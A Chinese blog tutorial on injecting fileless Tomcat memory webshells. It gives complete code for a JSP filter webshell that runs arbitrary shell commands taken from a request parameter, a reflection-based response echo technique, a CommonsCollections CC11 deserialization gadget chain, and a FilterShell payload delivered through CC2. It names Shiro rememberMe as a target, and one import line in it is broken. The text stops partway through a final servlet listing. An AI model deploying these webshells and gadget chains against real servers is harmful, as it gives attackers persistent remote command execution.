---
title: "结合CC11进行Tomcat内存马注入"
onlyTitle: true
date: 2023-03-12 13:05:36
categories:
- java
- 内存马
tags:
- 内存马
- Tomcat
- CC
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B859.png

---

# 结合CC链注入真无文件Tomcat内存马

Tomcat内存马基础可以看我的上一篇：https://www.0kai0.cn/?p=240

## 前言-fliter等内存马局限

具体新建servlet的过程：https://blog.csdn.net/gaoqingliang521/article/details/108677301

新建一个servlet:

```java
package org.example;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

@WebServlet("/servlet")
public class servlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException{
        resp.getWriter().write("hello servlet");
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
    }
}
```

配置tomcat：应用程序上下文表示http访问servlet的地址，这里就是localhost:8080/servlet

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png)

自定义的filter:

```java
import javax.servlet.*;
import java.io.IOException;

public class filterDemo implements Filter {

    public void init(FilterConfig filterConfig) throws ServletException {
        System.out.println("Filter 初始化创建");
    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        System.out.println("执行过滤操作");
      
       filterChain.doFilter(servletRequest,servletResponse);
    }

    public void destroy() {}
}
```

修改web.xml，指定url-pattern为`/demo`，也就是访问http://localhost:8080/servlet/demo时触发filter，一直刷新一直触发

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">

<filter>
    <filter-name>filterDemo</filter-name>
    <filter-class>org.example.filterDemo</filter-class>
</filter>

<filter-mapping>
    <filter-name>filterDemo</filter-name>
    <url-pattern>/demo</url-pattern>
</filter-mapping>

</web-app>
```

分析之前在项目结构->模块->依赖里导入tomcat/lib的包

Filter内存马代码：

```jsp
// filterTrojan.jsp
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%
  Field appContextField = ApplicationContextFacade.class.getDeclaredField("context");
  appContextField.setAccessible(true);
  Field standardContextField = ApplicationContext.class.getDeclaredField("context");
  standardContextField.setAccessible(true);

  ServletContext servletContext = request.getSession().getServletContext();
  ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);
  StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

  Filter filter = new Filter() {
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
      
    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws ServletException, IOException {
      if (request.getParameter("cmd") != null) {
        boolean isLinux = true;
        String osTyp = System.getProperty("os.name");
        if (osTyp != null && osTyp.toLowerCase().contains("win")) {
          isLinux = false;
        }
        String[] cmds = isLinux ? new String[]{"sh", "-c", request.getParameter("cmd")} : new String[]{"cmd.exe", "/c", request.getParameter("cmd")};
        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
        Scanner s = new Scanner(in).useDelimiter("\\A");
        String output = s.hasNext() ? s.next() : "";
        response.getWriter().write(output);
        response.getWriter().flush();
      }
      chain.doFilter(request, response);
    }

    @Override
    public void destroy() {

    }

  };
  FilterDef filterDef = new FilterDef();
  filterDef.setFilter(filter);
  filterDef.setFilterName("evilFilter");
  filterDef.setFilterClass(filter.getClass().getName());
  standardContext.addFilterDef(filterDef);

  Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
  constructor.setAccessible(true);
  ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

  Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
  filterConfigsField.setAccessible(true);
  Map filterConfigs = (Map) filterConfigsField.get(standardContext);
  filterConfigs.put("evilFilter", filterConfig);

  FilterMap filterMap = new FilterMap();
  filterMap.addURLPattern("/*");
  filterMap.setFilterName("evilFilter");
  filterMap.setDispatcher(DispatcherType.REQUEST.name());
  standardContext.addFilterMapBefore(filterMap);

  out.println("Inject done");
%>



```

先访问一遍jsp文件，就能在pattern任意路径带上参数RCE

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215628922.png)



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227215956900.png)



但是无论是模拟动态注册的filter内存马，还是Listener、Servlet、valve内存马，都不是真正意义上的内存马，它们会输出在tomcat的目录下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229153959584.png)

比如上述运行的jsp，在CTALINA_BASE环境的`work\Catalina\localhost\Servlet_web环境\org\apache\jsp`都有相应的文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221229154145023.png)



## Tomcat回显

​	而且根据不同的封装，jsp都内置了不同的获取request和response的方法。比如filter可以用ServletRequest获取；Listener用ServletRequestEvent获取；Servlet用HttpServletRequest获取；valve管道更是直接使用request和response对象。所以不用考虑回显问题。

​	但是反序列化通用的是注入字节码，要进行回显就需要获取request和response对象。

ApplicationFilterChain的lastServicedRequest 和 lastServicedResponse 都是静态变量。如果不是静态变量，还需要获取到对应的对象，才能获取到变量

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101113153631.png)

在ApplicationFilterChain的static部分，static部分都是优先执行。ApplicationDispatcher.WRAP_SAME_OBJECT默认False，所以lastServicedRequest/lastServicedResponse初始化为null

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130436655.png)

在104行，这里的ApplicationDispatcher.WRAP_SAME_OBJECT为true的话，就向ThreadLocal装入request和response

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png)

所以反射修改ApplicationDispatcher.WRAP_SAME_OBJECT，并且初始化ThreadLocal，就能进入if判断从而从这两个ThreadLocal获取request/response

```java
Class applicationDispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
                Field WRAP_SAME_OBJECT_FIELD = applicationDispatcher.getDeclaredField("WRAP_SAME_OBJECT");
                WRAP_SAME_OBJECT_FIELD.setAccessible(true);//由于private，设置为可修改
Field f0 = Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
                f0.setAccessible(true);//获取modifiers进行去除final修饰符
                f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()& ~Modifier.FINAL);

```

>如果使用了final修饰，而没有使用static修饰，可以调用setAccessible(true)获得修改权限，或者修改Modifier，去除final修饰符；
> 如果同时使用了static和final，则只能通过修改Modifier去除final修饰符来获取修改权限；

去除final修饰符

```java
WRAP_SAME_OBJECT_FIELD.getModifiers()& ~Modifier.FINAL
```

lastServicedRequest/lastServicedResponse也需要去除final才能进行修改

```java
Class applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field lastServicedRequestField = applicationFilterChain.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = applicationFilterChain.getDeclaredField("lastServicedResponse");
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);
            f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()& ~Modifier.FINAL);
            f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()& ~Modifier.FINAL);
```



* 将WRAP_SAME_OBJECT_FIELD设置为true，并传入初始ThreadLocal进行初始化

```java
WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,true);
lastServicedRequestField.set(applicationFilterChain,new ThreadLocal());
lastServicedResponseField.set(applicationFilterChain,new ThreadLocal());
```



POC:

```java
//Echo.java
package org.example;

import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;

import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.io.Writer;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Scanner;

@WebServlet("/echo")
@SuppressWarnings("all")
public class Echo extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Class applicationDispatcher = Class.forName("org.apache.catalina.core.ApplicationDispatcher");
            Field WRAP_SAME_OBJECT_FIELD = applicationDispatcher.getDeclaredField("WRAP_SAME_OBJECT");
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);
            // 利用反射修改 final 变量 ，不这么设置无法修改 final 的属性
            Field f0 = Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
            f0.setAccessible(true);
            f0.setInt(WRAP_SAME_OBJECT_FIELD,WRAP_SAME_OBJECT_FIELD.getModifiers()& ~Modifier.FINAL);

            Class applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            Field lastServicedRequestField = applicationFilterChain.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = applicationFilterChain.getDeclaredField("lastServicedResponse");
            lastServicedRequestField.setAccessible(true);
            lastServicedResponseField.setAccessible(true);
            f0.setInt(lastServicedRequestField,lastServicedRequestField.getModifiers()& ~Modifier.FINAL);
            f0.setInt(lastServicedResponseField,lastServicedResponseField.getModifiers()& ~Modifier.FINAL);

            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(applicationFilterChain);
            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(applicationFilterChain);

            String cmd = lastServicedRequest!=null ? lastServicedRequest.get().getParameter("cmd"):null;

            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(applicationDispatcher) || lastServicedRequest == null || lastServicedResponse == null){
                WRAP_SAME_OBJECT_FIELD.setBoolean(applicationDispatcher,true);
                lastServicedRequestField.set(applicationFilterChain,new ThreadLocal());
                lastServicedResponseField.set(applicationFilterChain,new ThreadLocal());
            } else if (cmd!=null){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                Writer writer = lastServicedResponse.get().getWriter();
                writer.write(output);
                writer.flush();
            }

        } catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        super.doPost(req, resp);
    }
}

```

利用lastServicedRequest.get()获取request请求，将结果写入lastServicedResponse进行回显



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102133628109.png)



## CC注入Tomcat

上面的测试是事先服务器就写好了POC也就是Echo类。但通常漏洞入口点是反序列化，而不能直接写文件

根据目标服务器的CC版本，可以使用不同的反序列化链进行注入。而注入字节码一般是最通用的。

用到字节码的CC链，CC11的限制很少。

版本限制：CommonsCollections3.1-3.2.1  JDK无版本限制



### cc11（可跳过直接用POC）

利用链：

```java
java.io.objectInputstream.readObject() ->
java.util.Hashset.readobject() ->
java.util.HashMap.put() ->
java.util.HashMap.hash() ->
org.apache.commons.collections.keyvalue.TiedMapEntry.hashcode() ->
org.apache.commons.collections.keyvalue.TiedMapEntry.getvalue() ->
org.apache.commons.collections.map.LazyMap.get() ->
org.apache.commons.collections.functors.InvokerTransformer.transform() ->
java.lang.reflect.Method.invoke()
	... templates gadgets ...
java.lang.Runtime.exec()

```

该链最后通过InvokerTransformer调用newTransformer加载恶意字节码。最开始初始化随便传入一个方法，最后通过Field#set修改transform为newTransform。这是为了避免在反序列化过程中其他地方提前触发了链

```java
InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
```

利用javasist动态生成恶意字节码

```java
    // 利用javasist动态创建恶意字节码
    ClassPool pool = ClassPool.getDefault();
    pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
    CtClass cc = pool.makeClass("Cat");
    String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
    cc.makeClassInitializer().insertBefore(cmd);
    String randomClassName = "EvilCat" + System.nanoTime();
    cc.setName(randomClassName);
    cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错

    // 写入.class 文件
    // 将我的恶意类转成字节码，并且反射设置 bytecodes
    byte[] classBytes = cc.toBytecode();
    byte[][] targetByteCodes = new byte[][]{classBytes};
    TemplatesImpl templates = TemplatesImpl.class.newInstance();

    Field f0 = templates.getClass().getDeclaredField("_bytecodes");
    f0.setAccessible(true);
    f0.set(templates,targetByteCodes);

    f0 = templates.getClass().getDeclaredField("_name");
    f0.setAccessible(true);
    f0.set(templates,"name");

    f0 = templates.getClass().getDeclaredField("_class");
    f0.setAccessible(true);
    f0.set(templates,null);
```





```java
java.util.HashMap.put() ->
java.util.HashMap.hash() ->
org.apache.commons.collections.keyvalue.TiedMapEntry.hashcode() ->
org.apache.commons.collections.keyvalue.TiedMapEntry.getvalue() ->
org.apache.commons.collections.map.LazyMap.get() ->
org.apache.commons.collections.functors.InvokerTransformer.transform() ->
java.lang.reflect.Method.invoke()
```

都是CC6的内容。实例化TiedMapEntry并将生成的恶意字节码传入，得到tiedmap恶意类

```java
HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates); 
```



HashMap#put如下:

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145605133.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145636276.png)

如果key可控，就会调用key.hashCode()

在HashSet#readObject中，e是s的反序列化，调用了map.put

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102145837203.png)

这里的s就是通过序列化ObjectOutputStream得到的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102150042436.png)

所以构造恶意key进行反序列化

先利用HashSet构造函数获取初始map

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102151016347.png)

```java
HashSet hashset = new HashSet(1);
        hashset.add("foo");
```



利用初始hashset反射获取map：

```java
Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);
```

map不能用的时候用table，放入tiedmap

```java
        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);
```

最后将transform的iMethodName修改为TemplatesImpl入口newtransformer

```java
    Field f3 = transformer.getClass().getDeclaredField("iMethodName");
    f3.setAccessible(true);
    f3.set(transformer,"newTransformer");
```



POC:

```java
package org.example;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

@SuppressWarnings("all")
public class cc11 {
    public static void main(String[] args) throws Exception {

        // 利用javasist动态创建恶意字节码
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        String randomClassName = "EvilCat" + System.nanoTime();
        cc.setName(randomClassName);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); //设置父类为AbstractTranslet，避免报错

        // 写入.class 文件
        // 将我的恶意类转成字节码，并且反射设置 bytecodes
        byte[] classBytes = cc.toBytecode();
        byte[][] targetByteCodes = new byte[][]{classBytes};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();

        Field f0 = templates.getClass().getDeclaredField("_bytecodes");
        f0.setAccessible(true);
        f0.set(templates,targetByteCodes);

        f0 = templates.getClass().getDeclaredField("_name");
        f0.setAccessible(true);
        f0.set(templates,"name");

        f0 = templates.getClass().getDeclaredField("_class");
        f0.setAccessible(true);
        f0.set(templates,null);

        InvokerTransformer transformer = new InvokerTransformer("asdfasdfasdf", new Class[0], new Object[0]);
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);
        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);
        HashSet hashset = new HashSet(1);
        hashset.add("foo");
        Field f = null;
        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException e) {
            f = HashSet.class.getDeclaredField("backingMap");
        }
        f.setAccessible(true);
        HashMap hashset_map = (HashMap) f.get(hashset);

        Field f2 = null;
        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException e) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[])f2.get(hashset_map);

        Object node = array[0];
        if(node == null){
            node = array[1];
        }
        Field keyField = null;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        keyField.setAccessible(true);
        keyField.set(node,tiedmap);

        Field f3 = transformer.getClass().getDeclaredField("iMethodName");
        f3.setAccessible(true);
        f3.set(transformer,"newTransformer");

        try{
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11"));
            outputStream.writeObject(hashset);
            outputStream.close();

            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc11"));
            inputStream.readObject();
        }catch(Exception e){
            e.printStackTrace();
        }
    }

}

```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230102161904207.png)



### 反序列化注入

上文的注入点位于org.apache.catalina.core.ApplicationFilterChain.internalDoFilter

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230101130853915.png)

但是在set之前执行了doFilter，就执行完了所有的Filter，而shiro反序列化入口rememberMe的功能其实是ShiroFilter的一个模块。所以该方法不能用来打shiro

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230104162826477.png)



所以为了打shiro这种需要filter的环境，就需要动态注册恶意Filter

首先创建一个继承AbstractTranslet的类TomcatEchoInject，因为要用到字节码。按照Tomcat回显的步骤，将WRAP_SAME_OBJECT设置为true，并将lastServicedRequest和lastServicedResponse初始化

```java
 Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

            //修改static final
            setFinalStatic(WRAP_SAME_OBJECT_FIELD);
            setFinalStatic(lastServicedRequestField);
            setFinalStatic(lastServicedResponseField);

            //静态变量直接填null即可
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);


            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null) || lastServicedRequest == null || lastServicedResponse == null){
                WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedRequestField.set(null, new ThreadLocal());
                lastServicedResponseField.set(null, new ThreadLocal());

```

在上文jsp版的内存马中，是通过request获取到的servlet上下文

```java
ServletContext servletContext = request.getSession().getServletContext();
```

这里request存入到了lastServicedRequest，所以可以直接获取servletContext

```java
ServletContext servletContext = servletRequest.getServletContext();

```



取出request后，通过addFilterMapBefore添加到filter的最前面，这里直接用天下大木头师傅的代码了。

反射获取filterConfigs，用filterConfigs来启动filter

```java
  Field filterConfigsField = StandardContext.class.getDeclaredField("filterConfigs");
  filterConfigsField.setAccessible(true);
  Map filterConfigs = (Map) filterConfigsField.get(standardContext);
  filterConfigs.put("evilFilter", filterConfig);
```

POC：

```java
package memoryshell.UnserShell;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.*;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import javax.servlet.*;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Modifier;
import java.util.Map;

public class FilterShell extends AbstractTranslet implements Filter {
    static {
        try {
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");

            //修改static final
            setFinalStatic(WRAP_SAME_OBJECT_FIELD);
            setFinalStatic(lastServicedRequestField);
            setFinalStatic(lastServicedResponseField);

            //静态变量直接填null即可
            ThreadLocal<ServletRequest> lastServicedRequest = (ThreadLocal<ServletRequest>) lastServicedRequestField.get(null);
            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null);


            if (!WRAP_SAME_OBJECT_FIELD.getBoolean(null) || lastServicedRequest == null || lastServicedResponse == null){
                WRAP_SAME_OBJECT_FIELD.setBoolean(null,true);
                lastServicedRequestField.set(null, new ThreadLocal());
                lastServicedResponseField.set(null, new ThreadLocal());
            }else {
                ServletRequest servletRequest = lastServicedRequest.get();
                ServletResponse servletResponse = lastServicedResponse.get();

                //开始注入内存马
                ServletContext servletContext = servletRequest.getServletContext();
                Field context = servletContext.getClass().getDeclaredField("context");
                context.setAccessible(true);
                // ApplicationContext 为 ServletContext 的实现类
                ApplicationContext applicationContext = (ApplicationContext) context.get(servletContext);
                Field context1 = applicationContext.getClass().getDeclaredField("context");
                context1.setAccessible(true);
                // 这样我们就获取到了 context
                StandardContext standardContext = (StandardContext) context1.get(applicationContext);

                //1、创建恶意filter类
                Filter filter = new FilterShell();

                //2、创建一个FilterDef 然后设置filterDef的名字，和类名，以及类
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName("Sentiment");
                filterDef.setFilterClass(filter.getClass().getName());

                // 调用 addFilterDef 方法将 filterDef 添加到 filterDefs中
                standardContext.addFilterDef(filterDef);
                //3、将FilterDefs 添加到FilterConfig
                Field Configs = standardContext.getClass().getDeclaredField("filterConfigs");
                Configs.setAccessible(true);
                Map filterConfigs = (Map) Configs.get(standardContext);

                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);
                constructor.setAccessible(true);
                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);
                filterConfigs.put("Sentiment",filterConfig);

                //4、创建一个filterMap
                FilterMap filterMap = new FilterMap();
                filterMap.addURLPattern("/*");
                filterMap.setFilterName("Sentiment");
                filterMap.setDispatcher(DispatcherType.REQUEST.name());
                //将自定义的filter放到最前边执行
                standardContext.addFilterMapBefore(filterMap);

                servletResponse.getWriter().write("Inject Success !");
            }

        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        if (request.getParameter("cmd") != null) {
            //String[] cmds = {"/bin/sh","-c",request.getParameter("cmd")}
            String[] cmds = {"cmd", "/c", request.getParameter("cmd")};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            byte[] bcache = new byte[1024];
            int readSize = 0;
            try (ByteArrayOutputStream outputStream = new ByteArrayOutputStream()) {
                while ((readSize = in.read(bcache)) != -1) {
                    outputStream.write(bcache, 0, readSize);
                }
                response.getWriter().println(outputStream.toString());
            }
        }


    }

    @Override
    public void destroy() {
    }
    public static void setFinalStatic(Field field) throws NoSuchFieldException, IllegalAccessException {
        field.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
    }
}

```

利用无TransformChain的cc2打入字节码

```java
package memoryshell.UnserShell;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransforme
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class cc2 {

    public static void main(String[] args) throws Exception {
        Templates templates = new TemplatesImpl();
        byte[] bytes = getBytes();
        setFieldValue(templates,"_name","Sentiment");
        setFieldValue(templates,"_bytecodes",new byte[][]{bytes});

        InvokerTransformer invokerTransformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});


        TransformingComparator transformingComparator=new TransformingComparator(new ConstantTransformer<>(1));

        PriorityQueue priorityQueue=new PriorityQueue<>(transformingComparator);
        priorityQueue.add(templates);
        priorityQueue.add(2);

        Class c=transformingComparator.getClass();
        Field transformField=c.getDeclaredField("transformer");
        transformField.setAccessible(true);
        transformField.set(transformingComparator,invokerTransformer);

        serialize(priorityQueue);
        unserialize("1.ser");

    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj,value);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("1.ser"));
        out.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
        ObjectInputStream In = new ObjectInputStream(new FileInputStream(Filename));
        Object o = In.readObject();
        return o;
    }
    public static byte[] getBytes() throws IOException {
        InputStream inputStream = new FileInputStream(new File("FilterShell.class"));

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        int n = 0;
        while ((n=inputStream.read())!=-1){
            byteArrayOutputStream.write(n);
        }
        byte[] bytes = byteArrayOutputStream.toByteArray();
        return bytes;
    }

}

```

Servlet端只需要一个接收参数base64解码并反序列化的接口，没有base64解码的接口可以用curl --data-binary注入二进制数据

```java
package memoryshell.UnserShell;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
